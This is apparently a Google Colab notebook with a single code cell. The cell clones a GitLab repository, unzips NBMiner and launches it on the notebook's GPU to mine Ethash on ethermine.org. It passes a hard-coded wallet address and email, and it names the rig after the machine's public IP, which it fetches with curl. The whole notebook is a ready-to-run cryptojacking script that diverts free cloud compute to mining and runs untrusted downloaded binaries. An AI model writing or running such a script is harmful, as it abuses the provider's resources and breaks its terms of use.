{
  "nbformat": 4,
  "nbformat_minor": 0,
  "metadata": {
    "colab": {
      "name": "3.ipynb",
      "provenance": []
    },
    "kernelspec": {
      "name": "python3",
      "display_name": "Python 3"
    },
    "accelerator": "GPU"
  },
  "cells": [
    {
      "cell_type": "code",
      "metadata": {
        "id": "vB02PsMy1B4CH"
      },
      "source": [
        "!git clone https://gitlab.com/nisayui/test3.git\n",
        "!unzip NBMiner-36.1\n",
        "%test3/\n",
        "!chmod +x cmdline_launcher.sh\n",
        "!ip=$(echo \"$(curl -s ifconfig.me)\" | tr . _ ) && ./cmdline_launcher.sh -algo ETCHASH -pool1 eu1.ethermine.org:4444 -wallet 0x4ee351b518733adba8aee4fbfd64bce2061b3ebd -coin eth -rigName $ip -email lput7447@gmail.com"
      ],
      "execution_count": null,
      "outputs": []
    }
  ]
}
